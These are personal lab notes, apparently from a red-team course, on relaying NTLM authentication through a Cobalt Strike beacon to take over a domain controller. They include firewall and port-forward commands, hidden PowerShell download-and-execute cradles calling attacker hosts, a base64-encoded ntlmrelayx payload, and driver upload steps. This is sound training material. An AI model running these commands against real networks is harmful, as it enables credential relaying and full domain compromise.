NTLM authentication uses a 3-way handshake between a client and server.  The high-level steps are as follows:

1. The client makes an authentication request to a server for a resource it wants to access.
2. The server sends a challenge to the client - the client needs to encrypt the challenge using the hash of their password.
3. The client sends the encrypted response to the server, which contacts a domain controller to verify the encrypted challenge is correct.

During an on-premise penetration test, NTLM relaying with tools like [Responder](https://github.com/lgandx/Responder) and [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/tree/master/impacket/examples/ntlmrelayx) is quite trivial.  However, it's a different story with this style of red team assessment, not least because we can't typically run Python tools on Windows.  Port 445 is always bound and in use by Windows - even local admins can't arbitrarily redirect traffic bound to this port or bind another tool to this port.

It's still possible to do with Cobalt Strike, but requires the use of multiple capabilities simultaneously.

1. A [driver](https://reqrypt.org/windivert.html) to redirect traffic destined for port 445 to another port (e.g. 8445) that we can bind to.
2. A reverse port forward on the port the SMB traffic is being redirected to.  This will tunnel the SMB traffic over the C2 channel to our Team Server.
3. The tool of choice (ntlmrelayx) will be listening for SMB traffic on the Team Server.
4. A SOCKS proxy is to allow ntlmrelayx to send traffic back into the target network.

![[Pasted image 20231204161039.png]]

# NTLM Setup

on `WKSTN-2` add two firewall rules to enable port forwarding from `WKSTN` to the `ATTACKER DESKTOP` beacon 
- need to have system on the machine that trying to do this on

firewall rule for `8445-in`
`powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445`
```powershell
[12/04 21:12:11] beacon> powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445
[12/04 21:12:11] [*] Tasked beacon to run: New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445
[12/04 21:12:11] [+] host called home, sent: 343 bytes
[12/04 21:12:14] [+] received output:
#< CLIXML


Name                          : {72979970-39b9-49e6-a451-1a7e2853c714}
DisplayName                   : 8445-In
Description                   : 
DisplayGroup                  : 
Group                         : 
Enabled                       : True
Profile                       : Any
Platform                      : {}
Direction                     : Inbound
Action                        : Allow
EdgeTraversalPolicy           : Block
LooseSourceMapping            : False
LocalOnlyMapping              : False
Owner                         : 
PrimaryStatus                 : OK
Status                        : The rule was parsed successfully from the store. (65536)
EnforcementStatus             : NotApplicable
PolicyStoreSource             : PersistentStore
PolicyStoreSourceType         : Local
RemoteDynamicKeywordAddresses : 
```
firewall rule for `8080-in`
`powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080`
```powershell
[12/04 21:12:21] beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
[12/04 21:12:21] [*] Tasked beacon to run: New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
[12/04 21:12:21] [+] host called home, sent: 343 bytes
[12/04 21:12:24] [+] received output:
#< CLIXML


Name                          : {4aa7bb5e-534f-4192-b587-ac49a1d0f99a}
DisplayName                   : 8080-In
Description                   : 
DisplayGroup                  : 
Group                         : 
Enabled                       : True
Profile                       : Any
Platform                      : {}
Direction                     : Inbound
Action                        : Allow
EdgeTraversalPolicy           : Block
LooseSourceMapping            : False
LocalOnlyMapping              : False
Owner                         : 
PrimaryStatus                 : OK
Status                        : The rule was parsed successfully from the store. (65536)
EnforcementStatus             : NotApplicable
PolicyStoreSource             : PersistentStore
PolicyStoreSourceType         : Local
RemoteDynamicKeywordAddresses : 
```

start two `reverse port forwards`

1st `reverse port forward` for hitting `SMB` listener

```powershell
[12/04 21:12:50] beacon> rportfwd 8445 localhost 445
[12/04 21:12:50] [+] started reverse port forward on 8445 to localhost:445
[12/04 21:12:50] [*] Tasked beacon to forward port 8445 to localhost:445
[12/04 21:12:50] [+] host called home, sent: 10 bytes
```
2nd `reverse port forward` for downloading the `powershell cradle`
`rportfwd 8080 localhost 80`
![[Pasted image 20231204170702.png]]
ensure `socks5` proxy is setup, it doesn't have to be a `socks5` 
`socks 1080`
![[Pasted image 20231204171929.png]]
setup `download cradle` via `cobalt strike` `Scripted Web Service` with `SMB` listener via `powershell`
- setup spits out this `cradle`  `powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.50:80/b'))"`

![[Pasted image 20231204173328.png]]

# MAKE SURE THAT SOCKS PROXY IS SETUP ON `WKSTN-2` `SYSTEM` & `/ETC/PROXYCHAINS` is matching!!

start `ntlmrelayx.py` on `attacker desktop` `SSH Team Server` with command:
- where `10.10.122.10` is the ip address of `dc-2.dev.cyberbotic.io` - the target `-t`
- where the `encoded` portion is the downloading cradle pointing at `http://10.10.123.102:8080/b`, and `/b` is the SMB payload - when cyberfchef'ing reverse to figure out was was base64 encoded get an error...
```
sudo proxychains ntlmrelayx.py -t smb://10.10.122.10 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKABoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMgAzAC4AMQAwADIAOgA4ADAAOAAwAC8AYgApAAoA'


the encoding = iex (new-object net.webclient).downloadstring("http://10.10.123.102:8080/b")
iex (new-object net.webclient).downloadstring("http://10.10.123.102:8080/b")

# this doesnt work
aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKABoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMgAzAC4AMQAwADIAOgA4ADAAOAAwAC8AYgApAAoA'
```
![[Pasted image 20231204174637.png]]
*[PortBender](https://github.com/praetorian-inc/PortBender) is a reflective DLL and aggressor script specifically designed to help facilitate relaying through Cobalt Strike.  It requires that the driver be located in the current working directory of the Beacon.  It makes sense to use `C:\Windows\System32\drivers` since this is where most Windows drivers go.*

changing directories to `C:\windows\system32\drivers`
uploading `C:\Tools\Portbender\WinDivert64.sys`
```powershell
beacon> cd C:\Windows\system32\drivers
beacon> upload C:\Tools\PortBender\WinDivert64.sys
```
use `PortBender redirect 445 8445` to redirect all `445` tracker to be redirected `8445` which makes the traffic valid for previously made `firewall` rules
![[Pasted image 20231204174544.png]]
to stop `Port Bender` when finished
```
beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 2    5740  PortBender

beacon> jobkill 2
beacon> kill 5740
```
# NTLMrelay Trigger
*To trigger the attack, we need to coerce a user or a machine to make an authentication attempt to Workstation 2.  Let's do it manually for now, by using the console of Workstation 1 as the user nlamb.  This user is a domain admin, so we can relay the authentication request to the domain controller.*

on `WKSTN-1`
![[Pasted image 20231204180141.png]]
can see if there was a connection made in the  `TEAM SERVER SSH` with the `ntlmrelayx.py` listener
![[Pasted image 20231204180332.png]]
in the `cobaltstrike` web log can check to ensure that the `download cradle` worked
![[Pasted image 20231204180509.png]]
now just `link` to `dc-2.dev.cyberbotic.io` using the `SMB listener`

`link dc-2.dev.cyberbotic.io TSVCPIPE-1337imherebitch`
![[Pasted image 20231204180640.png]]
on as system on `DC-2`
![[Pasted image 20231204180722.png]]

# Trouble Shooting

ensure that `socks` / `port forwards` are set up correctly and restart the `ntlmrelayx.py` session once they are fixed.